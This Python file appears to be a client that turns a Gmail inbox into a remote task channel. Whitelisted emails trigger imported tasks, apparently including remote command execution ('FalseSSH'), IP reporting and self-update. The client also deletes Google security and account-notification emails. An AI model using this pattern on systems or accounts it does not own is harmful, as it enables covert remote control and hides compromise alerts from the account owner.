from datetime import datetime
import re
from config import login, key, get_password, white_list
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import smtplib, ssl
import time
import imaplib
import email
import os
import sys
import socket
from requests import get
from getpass import getpass, getuser

from utils import *

from tasks.exec import FalseSSH
from tasks.ip import SendIP
from tasks.task import MailTask
from tasks.update import SelfUpdate

PURPLE = '\033[95m'
BLUE = '\033[94m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
RESET = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'

class MailBox():
	def __init__(self, server, args):
		print("Attempting to connect...")
		self.server = server
		self.server.login(login["user"], login["password"])
		print("SMTP connected for sending mails!")
		self.inbox = imaplib.IMAP4_SSL("imap.gmail.com")
		self.inbox.login(login["user"], login["password"])
		print("IMAP connected for receiving mails!")

		self.mails = []
		self.workers = []
		self.tasks_done = {}
		self.key = None
		self.white_list = white_list
		self.identifier = make_email_identifier()
		self.login_adrr = login['user']
		self.mail_addr = make_email_address(login['user'], self.identifier)
		print('Identifier: ' + self.identifier)
		print('Mail: ' + self.mail_addr)
		self.do_ip = SendIP(self, self.identifier)
		self.do_exec = FalseSSH(
			self, self.mail_addr, get_password(key, 1)['password'])
		self.do_tobe = MailTask(self)
		self.do_update = SelfUpdate(self)


	def send_mail(self, body, subject="", to_addr=None, from_addr=None, reply=None):
		if from_addr == None:
			from_addr = self.mail_addr
		if to_addr == None:
			to_addr = self.mail_addr

		message = MIMEMultipart()

		if reply != None:
			now = datetime.now()
			current_time = now.strftime("%H:%M:%S - %d/%m/%Y")
			subject = "ACK: " + reply['Subject']+ " - " + current_time

		message["Message-ID"] = email.utils.make_msgid()
		message["Subject"] = subject
		message["From"] = from_addr
		message["To"] = to_addr

		part1 = MIMEText(body, "plain")
		message.attach(part1)
		
		self.server.sendmail(from_addr, to_addr, message.as_string())

		print(YELLOW + "** Sending mail!" + RESET)
		print(YELLOW + "**" * 20 + RESET)
		self.print_one_mail(message, verbose=1)
		print(YELLOW + "**" * 20 + RESET)
		return message["Message-ID"]

	def fetch_mail(self, folder="inbox", search="ALL"):
		print("~" * 40)
		now = datetime.now()
		current_time = now.strftime("%H:%M:%S - %d/%m/%Y")
		print(f"{YELLOW}NEW FETCH{RESET} at {GREEN}{current_time}{RESET}")
		print("~" * 40)
		self.inbox.select(folder)
		type, data = self.inbox.search(None, search)
		mails = []
		for num in data[0].split()[-1::-1]:
			typ, data = self.inbox.fetch(num, '(RFC822)' )
			raw_email = data[0][1]
			raw_email_string = raw_email.decode('utf-8')
			msg = email.message_from_string(raw_email_string)
			mails.append(msg)
		return mails

	def filter(self, mail):
		email = get_email(mail['From'])
		if email not in self.white_list:
			print("\tFILTER: Mail from is not in white_list")
			return False
		msg = mail
		if mail["Message-ID"] in self.tasks_done:
			print("\tFILTER: Task already done")
			return False
		if not mail['subject']:
			print("\tFILTER: No subject")
			return False
		identifier = get_email_identifier(msg['To'])
		if not self.identifier == identifier and not identifier == "all":
			print("\tFILTER: Not for worker")
			return False
		if "ACK: " in mail['subject']:
			print("\tFILTER: ACK")
			self.tasks_done[self.get_payload(msg)[0]] = True
			self.tasks_done[mail["Message-ID"]] = True
			return False
		return True

	def do_tasks(self, mail):
		if self.do_tobe.is_for_me(mail):
			self.do_tobe.do_action(mail)
		elif self.do_ip.is_for_me(mail):
			self.do_ip.do_action(mail)
		elif self.do_exec.is_for_me(mail):
			self.do_exec.do_action(mail)
		elif self.do_update.is_for_me(mail):
			self.do_update.do_action(mail)
		self.tasks_done[mail["Message-ID"]] = True

	def init_box(self):
		self.do_tobe.ask_action(make_email_address(self.login_adrr, 'all'))
		self.mails = self.fetch_mail()
		self.do_cleaning()
		init_delcaration = None
		for id in range(0, len(self.mails)):
			self.print_one_mail(self.mails[id], id=id)
			if self.filter(self.mails[id]):
				if "INIT" in self.mails[id]['subject']:
					identifier = self.get_payload(self.mails[id])[0]
					if identifier == self.identifier:
						init_delcaration = self.mails[id]["Message-ID"]
					self.workers.append(identifier)
		if not init_delcaration:
			init_delcaration = self.send_mail(
				self.identifier, "INIT", to_addr=make_email_address(self.login_adrr, "all"))
			self.workers.append(self.identifier)
		self.workers.append('all')
		print(RED + "Workers: "+ RESET)
		for w in self.workers:
			if w == 'all':
				print("\t" + BLUE + w + RESET)
			elif w == self.identifier:
				print("\t" + GREEN + w + RESET)
			else:
				print("\t" + YELLOW + w + RESET)
		return init_delcaration

	def do_cleaning(self):
		move_to_trash_before_date(self.inbox, "noreply@google.com")
		move_to_trash_before_date(self.inbox, "no-reply@accounts.google.com")
		move_to_trash_before_date(self.inbox, "gmail-noreply@google.com")

	def do_routine(self):
		origin = self.init_box()
		last_len = -1
		last_id = origin
		while True:
			if last_len < len(self.mails):
				self.do_cleaning()
				last_len = len(self.mails)
				for id in range(0, len(self.mails)):
					self.print_one_mail(self.mails[id], id=id)
					if self.filter(self.mails[id]):
						self.do_tasks(self.mails[id])
					if origin == self.mails[id]["Message-ID"]:
						break
					elif last_id == self.mails[id]["Message-ID"]:
						break
					print()
				last_id = self.mails[0]["Message-ID"]
			else:
				import time
				time.sleep(60 * 1)
			self.mails = self.fetch_mail()

	def get_payload(self, msg):
		if msg.is_multipart():
				pay = [part.get_payload() for part in msg.get_payload()]
		else:
			pay = [msg.get_payload()]
		return pay


	def print_one_mail(self, msg, verbose=0, id=-1):
		if verbose >= 0:
			# Obj[] X -> X
			id_from = get_email_identifier(msg['from'])
			if not id_from:
				id_from = get_email(msg['From'], with_id=True)
			id_to = get_email_identifier(msg['to'])
			if not id_to:
				id_to = get_email(msg['to'], with_id=True)
			if id > -1:
				print(f"{YELLOW}{id}{RESET}\t", end='')
			print(f"[{BLUE}{msg['Subject']}{RESET}]")
			print(f"\t\t{PURPLE}{id_from}{RESET} -> {YELLOW}{id_to}{RESET}")
		if verbose >= 1:
			body = self.get_payload(msg)
			for i in range(len(body)):
				print(f"{BLUE}Body part{RESET} {YELLOW}{i}{RESET}/{BLUE}{len(body)}{RESET}:")
				print(f"{GREEN}{body[i]}{RESET}")
		# print("")

	def read_mail(self, refetch=False):
		if refetch or not len(self.mails):
			self.fetch_mail()
		for msg in self.mails:
			self.print_one_mail(msg)

	def is_same_mail(self, a, b):
		if a['subject'] == b['subject']:
			if a['from'] == b['from']:
				if a['to'] == b['to']:
					if self.get_payload(a) == self.get_payload(b):
						return True
		return False


def message_content(mime_msg):
	body = ""
	if mime_msg.is_multipart():
		for part in mime_msg.walk():
			if part.is_multipart():
				for subpart in part.get_payload():
					if subpart.is_multipart():
						for subsubpart in subpart.get_payload():
							body = body + \
								str(subsubpart.get_payload(decode=True)) + '\n'
					else:
						body = body + \
							str(subpart.get_payload(decode=True)) + '\n'
			else:
				body = body + str(part.get_payload(decode=True)) + '\n'
	else:
		body = body + str(mime_msg.get_payload(decode=True)) + '\n'
	body = bytes(body, 'utf-8').decode('unicode-escape')
	return body

def move_to_trash_before_date(m, from_addr, folder='INBOX', days_before=2):
	# required to perform search, m.list() for all lables, '[Gmail]/Sent Mail'
	no_of_msgs = int(m.select(folder)[1][0])
	# print(
	# 	"- Found a total of {1} messages in '{0}'.".format(folder, no_of_msgs))

	# before_date = (datetime.date.today() - datetime.timedelta(days_before)
	# 			   ).strftime("%d-%b-%Y")  # date string, 04-Jan-2013
	# search pointer for msgs before before_date
	# typ, data = m.search(None, '(BEFORE {0})'.format(before_date))
	typ, data = m.search(None, '(FROM "{0}")'.format(from_addr))

	if data != ['']:  # if not empty list means messages exist
		# no_msgs_del = data[0].split()[-1]  # last msg id in the list
		# print("- Marked {0} messages for removal with dates before {1} in '{2}'.".format(
		# 	no_msgs_del, before_date, folder))

		# move to trash
		for num in data[0].split():
			print(f"Deleting {num}")
			m.store(num, '+FLAGS', '\\Deleted')
		# m.store("1:{0}".format(no_msgs_del), '+FLAGS', '\\Deleted')
		#print("Deleted {0} messages.".format(no_msgs_del))
	else:
		print("- Nothing to remove.")

	return
